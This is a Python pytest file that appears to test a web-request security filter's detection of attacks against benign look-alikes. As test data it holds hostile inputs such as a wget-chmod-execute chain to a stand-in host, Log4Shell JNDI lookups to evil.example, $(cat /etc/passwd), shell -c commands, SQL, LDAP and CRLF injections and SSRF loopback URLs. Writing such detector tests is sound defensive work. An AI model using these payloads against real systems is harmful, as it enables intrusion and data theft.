import json
import logging
import re
import subprocess
import sys
import time
import zlib
from collections.abc import Iterator
from functools import cache
from typing import NamedTuple
from urllib.parse import urlencode

import pytest

from guard_core.models import SecurityConfig
from guard_core.sync.handlers.suspatterns_handler import (
    CATEGORY_CONTEXT_MAP,
    sus_patterns_handler,
)
from guard_core.sync.utils import detect_penetration_attempt
from tests.test_sus_patterns.test_detection_benchmark import (
    _ENV_VAR_PREFIXED_SHELL_DASH_C_CI_CONFIG_KNOWN_FP_REASON,
    _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
    _SEMICOLON_BARE_SHELL_CONTROL_KNOWN_FP_REASON,
    _SEMICOLON_QUOTED_SHELL_KNOWN_FP_REASON,
    _SQLI_EXEC_PROSE_INSTRUCTION_KNOWN_FP_REASON,
    _SQLI_GLUED_COMMENT_ANNOTATION_KNOWN_FP_REASON,
    _SQLI_ORDER_BY_BARE_DIGIT_KNOWN_FP_REASON,
    _SSRF_BARE_PRIVATE_IP_NO_URL_CONTEXT_KNOWN_FP_REASON,
    _SSTI_HASH_BRACE_CALL_SYNTAX_KNOWN_FP_REASON,
    _WHOLE_VALUE_BARE_SHELL_CONTROL_KNOWN_FP_REASON,
    _WHOLE_VALUE_SHELL_INVOCATION_KNOWN_FP_REASON,
    BENIGN_CORPUS,
    MALICIOUS_CORPUS,
)
from tests.test_sync.conftest import SyncMockGuardRequest, declare_route

_CONFIG = SecurityConfig()


@pytest.fixture(autouse=True)
def _force_enhanced_detection_singleton() -> Iterator[None]:
    sus_patterns_handler.configure(SecurityConfig())
    yield


def _body_request(payload: str, content_type: str) -> SyncMockGuardRequest:
    body = payload.encode("utf-8", errors="surrogateescape")
    headers = {"content-length": str(len(body))}
    if content_type:
        headers["content-type"] = content_type
    return SyncMockGuardRequest(body_content=body, headers=headers)


def _raw_body_request(payload: str) -> SyncMockGuardRequest:
    return _body_request(payload, "")


def _form_body_request(payload: str) -> SyncMockGuardRequest:
    return _body_request(
        urlencode({"field": payload}, errors="surrogateescape"),
        "application/x-www-form-urlencoded",
    )


def _json_body_request(payload: str) -> SyncMockGuardRequest:
    return _body_request(json.dumps({"outer": {"field": payload}}), "application/json")


def _multipart_body_request(payload: str) -> SyncMockGuardRequest:
    boundary = "B0"
    part = f'Content-Disposition: form-data; name="field"\r\n\r\n{payload}'
    body = f"--{boundary}\r\n{part}\r\n--{boundary}--\r\n"
    return _body_request(body, f"multipart/form-data; boundary={boundary}")


def _header_request(payload: str) -> SyncMockGuardRequest:
    return SyncMockGuardRequest(headers={"x-e2e-probe": payload})


def _user_agent_header_request(payload: str) -> SyncMockGuardRequest:
    return SyncMockGuardRequest(headers={"user-agent": payload})


def _query_param_request(payload: str) -> SyncMockGuardRequest:
    return SyncMockGuardRequest(query_params={"q": payload})


def _url_path_request(payload: str) -> SyncMockGuardRequest:
    return SyncMockGuardRequest(path=payload)


_MECHANISM_BUILDERS = {
    "raw_body": _raw_body_request,
    "form_body": _form_body_request,
    "json_body_nested": _json_body_request,
    "multipart_body": _multipart_body_request,
    "header": _header_request,
    "query_param": _query_param_request,
    "url_path": _url_path_request,
}

_BODY_MECHANISMS = ("raw_body", "form_body", "json_body_nested", "multipart_body")
_ALL_MECHANISMS = (*_BODY_MECHANISMS, "header", "query_param", "url_path")
_CONTEXT_ONLY_MECHANISMS = {
    "header": "header",
    "query_param": "query_param",
    "url_path": "url_path",
}


def _valid_mechanisms_for_category(category: str) -> tuple[str, ...]:
    contexts = CATEGORY_CONTEXT_MAP[category]
    extra = tuple(
        mechanism
        for mechanism, context in _CONTEXT_ONLY_MECHANISMS.items()
        if context in contexts
    )
    return _BODY_MECHANISMS + extra


_PRODUCTION_MALICIOUS_CASES = [
    case for case in MALICIOUS_CORPUS if case.detector == "production"
]
_PRODUCTION_BENIGN_CASES = [
    case for case in BENIGN_CORPUS if case.detector == "production"
]


class TargetedCase(NamedTuple):
    case_id: str
    request: SyncMockGuardRequest
    expect_detected: bool
    known_gap_reason: str = ""


_TARGETED_CASES: list[TargetedCase] = [
    TargetedCase(
        "embedded_probe_form_body_field_value",
        _body_request(
            "redirect=/wp-admin/install.php&ok=1",
            "application/x-www-form-urlencoded",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_nested_json_body",
        _body_request(
            '{"data":{"redirect_url":"/wp-admin/install.php"}}',
            "application/json",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_prose_body",
        _body_request(
            "Note: the scanner hit /wp-admin/install.php on our staging host.",
            "text/plain",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_prose_bot_probed_install_php",
        _body_request(
            "Intrusion alert: a bot probed /wp-admin/install.php from 203.0.113.9.",
            "text/plain",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_prose_waf_blocked_setup_config",
        _body_request(
            "Our WAF blocked a request targeting /wp-admin/setup-config.php just now.",
            "text/plain",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_prose_exploit_xmlrpc",
        _body_request(
            "Someone attempted to exploit /xmlrpc.php on the checkout server "
            "overnight.",
            "text/plain",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_prose_attacker_payload_wp_login",
        _body_request(
            "The attacker's payload tried to reach /wp-login.php with "
            "brute-force credentials.",
            "text/plain",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_prose_malicious_probe_phpinfo",
        _body_request(
            "Security team confirmed a malicious probe against /phpinfo.php "
            "last night.",
            "text/plain",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_prose_exploitation_attempts_install_php",
        _body_request(
            "Logs show repeated exploitation attempts on /wp-admin/install.php "
            "this morning.",
            "text/plain",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_prose_botnet_scanning_setup_config",
        _body_request(
            "A known botnet is scanning for /wp-admin/setup-config.php across "
            "our fleet.",
            "text/plain",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_prose_attacker_git_config",
        _body_request(
            "We detected an attacker trying to access /.git/config on the "
            "public endpoint.",
            "text/plain",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_prose_threat_feed_var_www_env",
        _body_request(
            "Threat feed flagged traffic hitting /var/www/.env from a Tor exit node.",
            "text/plain",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_prose_honeypot_etc_passwd",
        _body_request(
            "The honeypot recorded a request to /etc/passwd from an unknown scanner.",
            "text/plain",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_prose_scanner_hit_htpasswd",
        _body_request(
            "Vulnerability scanner attempted a hit on /.htpasswd during the pentest.",
            "text/plain",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_prose_blocked_probe_install_php",
        _body_request(
            "Blocked malicious traffic: a probe against /wp-admin/install.php "
            "was denied.",
            "text/plain",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_prose_repeated_attacks_xmlrpc",
        _body_request(
            "Suspicious activity: repeated attacks on /xmlrpc.php from a botnet.",
            "text/plain",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_prose_pentest_exploitation_setup_config",
        _body_request(
            "The pentest log shows exploitation of /wp-admin/setup-config.php "
            "succeeded.",
            "text/plain",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_prose_intrusion_detection_phpinfo",
        _body_request(
            "Intrusion detection triggered on a request for /phpinfo.php from "
            "a scanner.",
            "text/plain",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_prose_credential_stuffing_wp_login",
        _body_request(
            "A malicious actor tried /wp-login.php with a credential-stuffing list.",
            "text/plain",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_prose_bad_actor_dotenv",
        _body_request(
            "We caught a bad actor probing /.env on the load balancer.",
            "text/plain",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_prose_attacker_pivot_install_php",
        _body_request(
            "The attacker pivoted and hit /wp-admin/install.php right after recon.",
            "text/plain",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_prose_soc_exploit_setup_config",
        _body_request(
            "SOC confirmed the exploit attempt against /wp-admin/setup-config.php.",
            "text/plain",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_prose_attack_tooling_xmlrpc",
        _body_request(
            "Automated attack tooling scanned for /xmlrpc.php on every subdomain.",
            "text/plain",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_prose_scanner_git_config",
        _body_request(
            "The scanner also hit /.git/config while enumerating the site.",
            "text/plain",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_prose_hostile_probe_install_php",
        _body_request(
            "We saw a hostile probe against /wp-admin/install.php at 3am.",
            "text/plain",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_prose_malicious_crawler_phpinfo_wp_login",
        _body_request(
            "Malicious crawler attempted /phpinfo.php then moved to /wp-login.php.",
            "text/plain",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_prose_intrusion_var_www_env",
        _body_request(
            "The intrusion attempt against /var/www/.env was blocked by the WAF.",
            "text/plain",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_prose_exploit_kit_setup_config",
        _body_request(
            "An exploit kit tried to reach /wp-admin/setup-config.php twice.",
            "text/plain",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_prose_attack_traffic_install_php",
        _body_request(
            "Attack traffic hit /wp-admin/install.php from a known bad IP range.",
            "text/plain",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_prose_scanner_htpasswd_credentials",
        _body_request(
            "The scanner probed /.htpasswd looking for exposed credentials.",
            "text/plain",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_prose_bruteforce_bot_wp_login",
        _body_request(
            "A brute-force bot hit /wp-login.php more than 500 times overnight.",
            "text/plain",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_prose_recon_activity_xmlrpc",
        _body_request(
            "Recon activity included a hit on /xmlrpc.php before the real attack.",
            "text/plain",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_prose_spoofed_referer_install_php",
        _body_request(
            "The malicious request targeted /wp-admin/install.php via a "
            "spoofed referer.",
            "text/plain",
        ),
        True,
    ),
    TargetedCase(
        "embedded_probe_prose_ids_flagged_setup_config",
        _body_request(
            "Our IDS flagged an exploitation attempt against "
            "/wp-admin/setup-config.php.",
            "text/plain",
        ),
        True,
    ),
    TargetedCase(
        "cmd_absolute_path_shell_dash_c_query_param",
        _query_param_request("/bin/sh -c id"),
        True,
    ),
    TargetedCase(
        "cmd_env_prefixed_shell_dash_c_query_param",
        _query_param_request("env bash -c id"),
        True,
    ),
    TargetedCase(
        "cmd_env_abs_path_shell_dash_c_query_param",
        _query_param_request("/usr/bin/env bash -c id"),
        True,
    ),
    TargetedCase(
        "cmd_separator_env_abs_path_shell_query_param",
        _query_param_request("; /usr/bin/env sh -c id"),
        True,
    ),
    TargetedCase(
        "ldap_double_paren_wildcard_breakout_query_param",
        _query_param_request("*)((objectClass=*"),
        True,
    ),
    TargetedCase(
        "ldap_null_byte_truncation_breakout_query_param",
        _query_param_request("*))%00"),
        True,
    ),
    TargetedCase(
        "ldap_null_byte_single_paren_attr_uid_query_param",
        _query_param_request("uid=*)%00"),
        True,
    ),
    TargetedCase(
        "ldap_null_byte_single_paren_filter_uid_query_param",
        _query_param_request("(uid=*)%00"),
        True,
    ),
    TargetedCase(
        "ldap_null_byte_single_paren_attr_mail_query_param",
        _query_param_request("mail=*)%00"),
        True,
    ),
    TargetedCase(
        "ldap_null_byte_single_paren_attr_objectclass_query_param",
        _query_param_request("objectClass=*)%00"),
        True,
    ),
    TargetedCase(
        "ldap_glob_paren_null_mention_query_param",
        _query_param_request("glob pattern: *)%00 in filenames"),
        False,
    ),
    TargetedCase(
        "http_split_crlf_set_cookie_header",
        _header_request("x\r\nSet-Cookie: session=hijacked"),
        True,
    ),
    TargetedCase(
        "sqli_bare_comment_dashdash_query_param",
        _query_param_request("admin'--"),
        True,
    ),
    TargetedCase(
        "cms_probing_wp_content_themes_default_url_path",
        _url_path_request("/wp-content/themes/default"),
        True,
    ),
    TargetedCase(
        # D-74 and D-75 item 1: with no route knowledge the path keeps v4.4.0's verdict
        "recon_nested_inicio_html_url_path_no_route_flagged",
        _url_path_request("/en/inicio.html"),
        True,
    ),
    TargetedCase(
        # D-75: the app declares the route, so the same path is clean
        "recon_nested_inicio_html_url_path_declared_route_clean",
        declare_route(_url_path_request("/en/inicio.html"), "/en/inicio.html"),
        False,
    ),
    TargetedCase(
        "rest_path_k8s_namespace_pods_url_path_benign",
        _url_path_request("/api/v1/namespaces/default/pods"),
        False,
    ),
    TargetedCase(
        "rest_path_k8s_default_namespace_url_path_benign",
        _url_path_request("/api/v1/namespaces/default"),
        False,
    ),
    TargetedCase(
        "scan_value_cap_payload_before_cap_still_detected",
        SyncMockGuardRequest(
            query_params={
                "payload": "1 OR 1=1 UNION SELECT password FROM users--",
                **{f"pad{i}": "benign" for i in range(50)},
            }
        ),
        True,
    ),
    TargetedCase(
        "scan_value_cap_payload_past_default_cap",
        SyncMockGuardRequest(
            query_params={
                **{f"pad{i}": "benign" for i in range(520)},
                "payload": "1 OR 1=1 UNION SELECT password FROM users--",
            }
        ),
        True,
    ),
]


_BACKTICK_SQL_KEYWORD_EXEMPTION_BYPASS_TARGETED_CASES: list[TargetedCase] = [
    TargetedCase(
        "defect5_form_body_keyword_after_glued_shell_command",
        _form_body_request("search`whoami` LIMIT 10"),
        False,
        "a glued bare word inside backticks with no shell operator anywhere in "
        "the surrounding window and no adjacent strong SQL keyword is "
        "syntactically indistinguishable from a MySQL backtick-quoted "
        "identifier concatenated onto other text (MySQL quoted identifiers may "
        "sit directly adjacent to other tokens); this project's own benign "
        "corpus (cmd_injection_glued_plausible_token_ref_user_list, "
        "cmd_injection_glued_kebab_identifier_header_forward) pins the "
        "identical shape as non-threat, so flagging on spelling alone is the "
        "removed anti-pattern and flagging on structure alone is not possible "
        "here without an operator or SQL-keyword signal",
    ),
    TargetedCase(
        "defect5_json_body_keyword_before_glued_shell_command",
        _json_body_request("SELECT note; search`whoami`"),
        True,
    ),
    TargetedCase(
        "defect5_multipart_body_bare_chained_download_and_execute",
        _multipart_body_request(
            "set your profile bio to: "
            "`wget evil.com/x -O /tmp/x;chmod +x /tmp/x;/tmp/x`"
        ),
        True,
    ),
    TargetedCase(
        "defect5_query_param_prefix_command_word",
        _query_param_request("curl`whoami` data on file"),
        True,
    ),
]


_ROUND6_CMD_SUBSTITUTION_TARGETED_CASES: list[TargetedCase] = [
    TargetedCase(
        "round6_log4shell_direct_ldap_query_param",
        _query_param_request("${jndi:ldap://evil.example/a}"),
        True,
    ),
    TargetedCase(
        "round6_log4shell_obfuscated_lower_form_body",
        _form_body_request("${${lower:j}ndi:ldap://evil.example/a}"),
        True,
    ),
    TargetedCase(
        "round6_dollar_paren_unambiguous_json_body",
        _json_body_request("$(cat /etc/passwd)"),
        True,
    ),
    TargetedCase(
        "round6_dollar_brace_ifs_multipart_body",
        _multipart_body_request("${IFS}"),
        True,
    ),
    TargetedCase(
        "round6_dollar_paren_ambiguous_bare_query_param",
        _query_param_request("$(id)"),
        True,
    ),
    TargetedCase(
        "round6_dollar_paren_ambiguous_bare_url_path",
        _url_path_request("$(id)"),
        True,
    ),
    TargetedCase(
        "round6_dollar_paren_ambiguous_bare_raw_body_benign",
        _raw_body_request("$(id)"),
        False,
    ),
    TargetedCase(
        "round6_sql_keyword_not_glued_no_longer_exempts_dollar_query_param",
        _query_param_request("x$(id) JOIN accounts"),
        True,
    ),
    TargetedCase(
        "round6_sql_keyword_glued_no_space_still_exempts_dollar_query_param",
        _query_param_request("SELECT$(id)FROM users"),
        False,
    ),
    TargetedCase(
        "round6_denylist_nmap_glued_backtick_raw_body",
        _raw_body_request("x`nmap`"),
        False,
        "a glued bare word inside backticks with no shell operator anywhere in "
        "the surrounding window and no adjacent strong SQL keyword is "
        "syntactically indistinguishable from a MySQL backtick-quoted "
        "identifier concatenated onto other text; the command-name list this "
        "case used to depend on is the removed anti-pattern, and there is no "
        "structural signal left to distinguish nmap from any other bare word "
        "in this position",
    ),
    TargetedCase(
        "round6_log4shell_direct_ldap_custom_header",
        _header_request("${jndi:ldap://evil.example/a}"),
        True,
    ),
    TargetedCase(
        "round6_log4shell_obfuscated_lower_custom_header",
        _header_request("${lower:j}ndi"),
        True,
    ),
    TargetedCase(
        "round6_log4shell_obfuscated_default_value_custom_header",
        _header_request("${::-j}ndi"),
        True,
    ),
    TargetedCase(
        "round6_log4shell_direct_ldap_user_agent",
        _user_agent_header_request("${jndi:ldap://evil.example/a}"),
        True,
    ),
    TargetedCase(
        "round6_log4shell_obfuscated_lower_user_agent",
        _user_agent_header_request("${lower:j}ndi"),
        True,
    ),
    TargetedCase(
        "round6_log4shell_obfuscated_default_value_user_agent",
        _user_agent_header_request("${::-j}ndi"),
        True,
    ),
    TargetedCase(
        "round6_chaotic_user_agent_chrome_windows_benign",
        _user_agent_header_request(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ),
        False,
    ),
    TargetedCase(
        "round6_chaotic_user_agent_safari_macos_benign",
        _user_agent_header_request(
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
            "(KHTML, like Gecko) Version/17.0 Safari/605.1.15"
        ),
        False,
    ),
    TargetedCase(
        "round6_chaotic_user_agent_googlebot_benign",
        _user_agent_header_request(
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
        ),
        False,
    ),
    TargetedCase(
        "round6_chaotic_user_agent_curl_benign",
        _user_agent_header_request("curl/8.4.0"),
        False,
    ),
    TargetedCase(
        "round6_chaotic_user_agent_python_requests_benign",
        _user_agent_header_request("python-requests/2.31.0"),
        False,
    ),
    TargetedCase(
        "round6_chaotic_user_agent_postman_benign",
        _user_agent_header_request("PostmanRuntime/7.36.0"),
        False,
    ),
]


_DOLLAR_FP_AND_LOG4SHELL_BONUS_TARGETED_CASES: list[TargetedCase] = [
    TargetedCase(
        "former_fp_shell_docs_var_expansion_query_param",
        _query_param_request("export PATH=${HOME}/bin"),
        False,
    ),
    TargetedCase(
        "former_fp_shell_docs_var_expansion_url_path",
        _url_path_request("export PATH=${HOME}/bin"),
        False,
    ),
    TargetedCase(
        "former_fp_template_dollar_brace_var_query_param",
        _query_param_request("Set the amount with ${amount} in the template."),
        False,
    ),
    TargetedCase(
        "former_fp_template_dollar_brace_var_url_path",
        _url_path_request("Set the amount with ${amount} in the template."),
        False,
    ),
    TargetedCase(
        "former_fp_template_makefile_variable_query_param",
        _query_param_request(
            "The Makefile references $(CC) and $(CFLAGS) for the compiler."
        ),
        False,
    ),
    TargetedCase(
        "former_fp_template_makefile_variable_url_path",
        _url_path_request(
            "The Makefile references $(CC) and $(CFLAGS) for the compiler."
        ),
        False,
    ),
    TargetedCase(
        "disclosed_fp_jquery_selector_bare_id_call_query_param",
        _query_param_request("$(id).addClass('active');"),
        True,
    ),
    TargetedCase(
        "disclosed_fp_jquery_selector_bare_id_call_url_path",
        _url_path_request("$(id).addClass('active');"),
        True,
    ),
    TargetedCase(
        "former_fp_jquery_selector_hash_id_call_query_param",
        _query_param_request("$('#submit-button').on('click', handleSubmit);"),
        False,
    ),
    TargetedCase(
        "former_fp_jquery_selector_hash_id_call_url_path",
        _url_path_request("$('#submit-button').on('click', handleSubmit);"),
        False,
    ),
    TargetedCase(
        "log4shell_url_path_bonus_obfuscated_lower_bare",
        _url_path_request("${lower:j}ndi"),
        True,
    ),
    TargetedCase(
        "log4shell_url_path_bonus_obfuscated_default_value_bare",
        _url_path_request("${::-j}ndi"),
        True,
    ),
    TargetedCase(
        "log4shell_url_path_bonus_obfuscated_nested_full_exploit",
        _url_path_request("${${lower:j}ndi:ldap://evil.example/a}"),
        True,
    ),
]

_SSRF_IPV4_MAPPED_AND_TRAILING_DOT_TARGETED_CASES: list[TargetedCase] = [
    TargetedCase(
        "ssrf_ipv4_mapped_ipv6_loopback_query_param",
        _query_param_request("http://[::ffff:127.0.0.1]/"),
        True,
    ),
    TargetedCase(
        "ssrf_ipv4_mapped_ipv6_loopback_json_body",
        _body_request(
            '{"url":"http://[::ffff:127.0.0.1]/"}',
            "application/json",
        ),
        True,
    ),
    TargetedCase(
        "ssrf_localhost_trailing_dot_query_param",
        _query_param_request("http://localhost./"),
        True,
    ),
    TargetedCase(
        "ssrf_localhost_trailing_dot_json_body",
        _body_request('{"url":"http://localhost./"}', "application/json"),
        True,
    ),
    TargetedCase(
        "ssrf_ipv4_mapped_ipv6_public_query_param_not_flagged",
        _query_param_request("http://[::ffff:8.8.8.8]/"),
        False,
    ),
    TargetedCase(
        "ssrf_ipv4_mapped_ipv6_public_json_body_not_flagged",
        _body_request(
            '{"url":"http://[::ffff:8.8.8.8]/"}',
            "application/json",
        ),
        False,
    ),
]


def _nested_json_body_text(depth: int, leaf: str) -> str:
    leaf_json = json.dumps(leaf)
    return ('{"a":' * depth) + leaf_json + ("}" * depth)


_JSON_DEPTH_TARGETED_CASES: list[TargetedCase] = [
    TargetedCase(
        "json_nested_depth10_sqli_body",
        _body_request(_nested_json_body_text(10, "' OR 1=1--"), "application/json"),
        True,
    ),
    TargetedCase(
        "json_nested_depth40_sqli_body",
        _body_request(_nested_json_body_text(40, "' OR 1=1--"), "application/json"),
        True,
    ),
]


def _mechanism_for_case_id(mechanisms: tuple[str, ...], case_id: str) -> str:
    return mechanisms[zlib.crc32(case_id.encode()) % len(mechanisms)]


def _detected_via(mechanism: str, payload: str, app_serves_it: bool = False) -> bool:
    request = _MECHANISM_BUILDERS[mechanism](payload)
    if app_serves_it and mechanism == "url_path":
        declare_route(request, payload)
    result = detect_penetration_attempt(request, _CONFIG)
    return result.is_threat


def _fraction(numerator: int, denominator: int) -> str:
    percentage = 100.0 * numerator / denominator if denominator else 0.0
    return f"{numerator}/{denominator} ({percentage:.1f}%)"


_GLUED_KEBAB_IDENTIFIER_BACKTICK_KNOWN_FP_REASON = (
    "a kebab-style identifier glued to a backtick (`config`well-known`here`) is "
    "benign by design and is Phase 0's own accepted ambiguous-gate tradeoff for "
    "the backtick discriminator, already pinned in query_param by "
    "test_glued_kebab_identifier_backtick_payload_flagged_in_query_param, and "
    "stays correctly benign in request_body, where the branch never fires"
)

_URL_PATH_CODE_EXECUTION_KNOWN_FP_REASON = (
    "the url_path-only code-execution row (decided in D-70 4.14) flags a "
    "backtick pair or an sh -c in a URL path, so prose or SQL that carries "
    "one inside a path is flagged on purpose because a real path never holds "
    "either, and the row never runs in a body or query value"
)

_V440_NAMED_VALUE_KNOWN_FP_REASON = (
    "D-74 and D-75: v4.4.0 flags this named route path; in a URL path the route "
    "template decides, and a value in a header, query or body carries no route, "
    "so it stays flagged exactly as in v4.4.0"
)

_KNOWN_E2E_FALSE_POSITIVE_SOURCES: dict[str, tuple[str, str]] = {
    "path_version_top_level": (
        _V440_NAMED_VALUE_KNOWN_FP_REASON,
        "form_body",
    ),
    "path_management_nested_under_api": (
        _V440_NAMED_VALUE_KNOWN_FP_REASON,
        "form_body",
    ),
    "path_credentials_nested_under_service": (
        _V440_NAMED_VALUE_KNOWN_FP_REASON,
        "raw_body",
    ),
    "path_nested_inicio_html": (
        _V440_NAMED_VALUE_KNOWN_FP_REASON,
        "form_body",
    ),
    "path_nested_app_sourcemap": (
        _V440_NAMED_VALUE_KNOWN_FP_REASON,
        "multipart_body",
    ),
    "path_nested_source_extension_py": (
        _V440_NAMED_VALUE_KNOWN_FP_REASON,
        "multipart_body",
    ),
    "path_nested_source_extension_sh": (
        _V440_NAMED_VALUE_KNOWN_FP_REASON,
        "multipart_body",
    ),
    "path_nested_readme_md": (
        _V440_NAMED_VALUE_KNOWN_FP_REASON,
        "form_body",
    ),
    "path_language_route": (
        _V440_NAMED_VALUE_KNOWN_FP_REASON,
        "query_param",
    ),
    "path_system_status_route": (
        _V440_NAMED_VALUE_KNOWN_FP_REASON,
        "form_body",
    ),
    "path_nested_jsp_page": (
        _V440_NAMED_VALUE_KNOWN_FP_REASON,
        "query_param",
    ),
    "path_wp_content_uploads_media": (
        _V440_NAMED_VALUE_KNOWN_FP_REASON,
        "raw_body",
    ),
    "path_nested_shell_php_outside_uploads": (
        _V440_NAMED_VALUE_KNOWN_FP_REASON,
        "form_body",
    ),
    "path_nested_cmd_php_outside_uploads": (
        _V440_NAMED_VALUE_KNOWN_FP_REASON,
        "form_body",
    ),
    "path_system_logs_directory": (
        _V440_NAMED_VALUE_KNOWN_FP_REASON,
        "raw_body",
    ),
    "path_changelog_title_case_page": (
        _V440_NAMED_VALUE_KNOWN_FP_REASON,
        "query_param",
    ),
    "template_fp_call_branch_helper_format": (
        _SSTI_HASH_BRACE_CALL_SYNTAX_KNOWN_FP_REASON,
        "query_param",
    ),
    "sqli_url_path_products_order_by_bare_digit": (
        _SQLI_ORDER_BY_BARE_DIGIT_KNOWN_FP_REASON,
        "raw_body",
    ),
    "sqli_query_param_sort_order_by_bare_digit": (
        _SQLI_ORDER_BY_BARE_DIGIT_KNOWN_FP_REASON,
        "form_body",
    ),
    "sqli_header_config_timeout_glued_comment": (
        _SQLI_GLUED_COMMENT_ANNOTATION_KNOWN_FP_REASON,
        "query_param",
    ),
    "sqli_header_cookie_pref_timeout_glued_comment": (
        _SQLI_GLUED_COMMENT_ANNOTATION_KNOWN_FP_REASON,
        "form_body",
    ),
    "sqli_header_note_execute_sp_cleanup_prose": (
        _SQLI_EXEC_PROSE_INSTRUCTION_KNOWN_FP_REASON,
        "raw_body",
    ),
    "cmd_injection_prose_semicolon_quoted_env_prefixed_shell": (
        _SEMICOLON_QUOTED_SHELL_KNOWN_FP_REASON,
        "query_param",
    ),
    "cmd_injection_value_absolute_bash_login_flag": (
        _WHOLE_VALUE_SHELL_INVOCATION_KNOWN_FP_REASON,
        "multipart_body",
    ),
    "cmd_injection_value_absolute_shell_c_npm_start": (
        _WHOLE_VALUE_SHELL_INVOCATION_KNOWN_FP_REASON,
        "multipart_body",
    ),
    "cmd_injection_value_env_prefixed_bash_c_echo": (
        _WHOLE_VALUE_SHELL_INVOCATION_KNOWN_FP_REASON,
        "json_body_nested",
    ),
    "cmd_injection_value_bare_shell_control": (
        _WHOLE_VALUE_BARE_SHELL_CONTROL_KNOWN_FP_REASON,
        "query_param",
    ),
    "cmd_injection_ci_yaml_env_prefixed_run_step": (
        _ENV_VAR_PREFIXED_SHELL_DASH_C_CI_CONFIG_KNOWN_FP_REASON,
        "query_param",
    ),
    "cmd_injection_makefile_env_prefixed_recipe": (
        _ENV_VAR_PREFIXED_SHELL_DASH_C_CI_CONFIG_KNOWN_FP_REASON,
        "query_param",
    ),
    "file_inclusion_benign_readme_txt_link": (
        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
        "raw_body",
    ),
    "file_inclusion_benign_docs_readme_txt_link": (
        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
        "url_path",
    ),
    "file_inclusion_benign_terms_txt_link": (
        _RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON,
        "query_param",
    ),
    "cmd_injection_prose_semicolon_bare_shell_control": (
        _SEMICOLON_BARE_SHELL_CONTROL_KNOWN_FP_REASON,
        "header",
    ),
    "ssrf_bare_private_ip_upstream_query_param_value": (
        _SSRF_BARE_PRIVATE_IP_NO_URL_CONTEXT_KNOWN_FP_REASON,
        "url_path",
    ),
    "ssrf_bare_private_ip_internal_ip_header_value": (
        _SSRF_BARE_PRIVATE_IP_NO_URL_CONTEXT_KNOWN_FP_REASON,
        "url_path",
    ),
    "ssrf_bare_private_ip_host_query_param_value": (
        _SSRF_BARE_PRIVATE_IP_NO_URL_CONTEXT_KNOWN_FP_REASON,
        "raw_body",
    ),
    "ssrf_bare_private_ip_json_body_field_value": (
        _SSRF_BARE_PRIVATE_IP_NO_URL_CONTEXT_KNOWN_FP_REASON,
        "raw_body",
    ),
}

_KNOWN_E2E_FALSE_POSITIVES: dict[str, str] = {
    f"{case_id}[{mechanism}]": reason
    for case_id, (reason, mechanism) in _KNOWN_E2E_FALSE_POSITIVE_SOURCES.items()
}

BASELINE_MALICIOUS_DETECTED_TOTAL = 362
_LEGACY_BASELINE_MALICIOUS_DETECTED_TOTAL = 362

_REFERENCE_WORKLOAD_SECONDS = 0.1243


@cache
def _host_cpu_speed_factor() -> float:
    samples: list[float] = []
    for _ in range(3):
        start = time.process_time()
        total = 0
        for i in range(3_000_000):
            total += i * i
        samples.append(time.process_time() - start)
    return max(1.0, min(samples) / _REFERENCE_WORKLOAD_SECONDS)


_UNCOVERED_CPU_TIME_CEILING_SECONDS = 40.0
_CPU_TIME_REPORT_PATTERN = re.compile(r"cpu time: ([\d.]+)s")
_CHILD_CPU_TIME_SCRIPT = (
    "import sys, time, pytest\n"
    "start = time.process_time()\n"
    "code = pytest.main(['--no-cov', '-q', '-s', '-W', 'error', '-m', 'redos_timing',\n"
    " sys.argv[1]])\n"
    "print(f'cpu time: {time.process_time() - start:.3f}s')\n"
    "sys.exit(code)\n"
)


def _reset_singleton_to_legacy() -> None:
    sus_patterns_handler._compiler = None
    sus_patterns_handler._preprocessor = None
    sus_patterns_handler._semantic_analyzer = None
    sus_patterns_handler._performance_monitor = None
    sus_patterns_handler._threat_score_threshold = 1.0


@pytest.mark.redos_timing
def test_detect_penetration_attempt_recall_and_false_positive_rate(
    caplog: pytest.LogCaptureFixture,
) -> None:
    assert len(_PRODUCTION_MALICIOUS_CASES) >= 100
    assert len(_PRODUCTION_BENIGN_CASES) >= 100

    start = time.monotonic()

